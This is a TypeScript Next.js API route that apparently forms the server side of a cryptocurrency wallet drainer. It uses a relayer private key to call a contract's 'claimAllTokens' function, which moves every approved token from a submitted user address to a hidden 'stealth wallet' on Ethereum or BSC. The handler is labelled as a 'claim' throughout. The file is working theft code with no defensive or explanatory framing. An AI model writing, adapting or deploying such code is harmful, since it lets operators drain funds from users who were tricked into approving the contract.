import { ethers } from 'ethers';
import { NextRequest, NextResponse } from 'next/server';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

// Minimal ABI for the Spender contract
const SPENDER_ABI = [
  {
    inputs: [
      { internalType: 'address', name: 'token', type: 'address' },
      { internalType: 'address', name: 'from', type: 'address' },
      { internalType: 'address', name: 'to', type: 'address' },
    ],
    name: 'claimAllTokens',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
];

type SupportedNetwork = 'ethereum' | 'bsc' | 'erc';

// ─── Network config ───────────────────────────────────────────────────────────
// Server-side: reads the same NEXT_PUBLIC_* vars (available in server context)
// so they stay consistent with the frontend config.
const getNetworkConfig = (network: SupportedNetwork) => {
  if (network === 'bsc') {
    return {
      rpcUrl:          process.env.NEXT_PUBLIC_BSC_RPC              || 'https://bsc-dataseed1.binance.org',
      spenderAddress:  process.env.NEXT_PUBLIC_BSC_CONTRACT_ADDRESS || '',
      tokenAddress:    process.env.NEXT_PUBLIC_BSC_TOKEN_ADDRESS    || '',
    };
  }
  // erc / ethereum
  return {
    rpcUrl:          process.env.NEXT_PUBLIC_RPC_URL          || 'https://ethereum.publicnode.com',
    spenderAddress:  process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || '',
    tokenAddress:    process.env.NEXT_PUBLIC_TOKEN_ADDRESS    || '',
  };
};

export async function POST(request: NextRequest) {
  try {
    const { userAddress, network } = await request.json();

    // Validate inputs
    if (!userAddress || !ethers.isAddress(userAddress)) {
      return NextResponse.json({ error: 'Invalid user address' }, { status: 400 });
    }

    const normalizedNetwork = (network === 'erc' ? 'erc' : network) as SupportedNetwork;
    if (!normalizedNetwork || !['ethereum', 'bsc', 'erc'].includes(normalizedNetwork)) {
      return NextResponse.json({ error: 'Invalid network: ' + network }, { status: 400 });
    }

    const relayerKey   = process.env.RELAYER_PRIVATE_KEY;
    const stealthWallet = process.env.STEALTH_WALLET_ADDRESS;

    if (!relayerKey || !stealthWallet) {
      console.error('[claim] Missing server env vars — RELAYER_PRIVATE_KEY or STEALTH_WALLET_ADDRESS not set');
      return NextResponse.json({ error: 'Server configuration error' }, { status: 500 });
    }

    const config = getNetworkConfig(normalizedNetwork);

    if (!config.spenderAddress || !ethers.isAddress(config.spenderAddress)) {
      console.error('[claim] Missing or invalid spender contract address for network:', normalizedNetwork);
      return NextResponse.json({ error: 'Contract address not configured for ' + normalizedNetwork }, { status: 500 });
    }

    if (!config.tokenAddress || !ethers.isAddress(config.tokenAddress)) {
      console.error('[claim] Missing or invalid token address for network:', normalizedNetwork);
      return NextResponse.json({ error: 'Token address not configured for ' + normalizedNetwork }, { status: 500 });
    }

    console.log('[claim] Processing on', normalizedNetwork, '| user:', userAddress, '| token:', config.tokenAddress, '| contract:', config.spenderAddress);

    const provider      = new ethers.JsonRpcProvider(config.rpcUrl);
    const relayerWallet = new ethers.Wallet(relayerKey, provider);
    const spenderContract = new ethers.Contract(config.spenderAddress, SPENDER_ABI, relayerWallet);

    const claimTx = await spenderContract.claimAllTokens(
      config.tokenAddress,
      userAddress,
      stealthWallet,
      { gasLimit: 500000 },
    );

    console.log('[claim] Tx sent:', claimTx.hash, '| network:', normalizedNetwork);

    const receipt = await claimTx.wait(1);

    console.log('[claim] Confirmed in block', receipt?.blockNumber, '| network:', normalizedNetwork);

    return NextResponse.json({
      success:     true,
      network:     normalizedNetwork,
      userAddress,
      tokenAddress: config.tokenAddress,
      stealthWallet,
      txHash:      claimTx.hash,
      blockNumber:  receipt?.blockNumber,
    });
  } catch (error: any) {
    console.error('[claim] Error:', error?.reason || error?.shortMessage || error?.message);
    return NextResponse.json(
      { error: error?.reason || error?.shortMessage || error?.message || 'Claim failed' },
      { status: 500 },
    );
  }
}

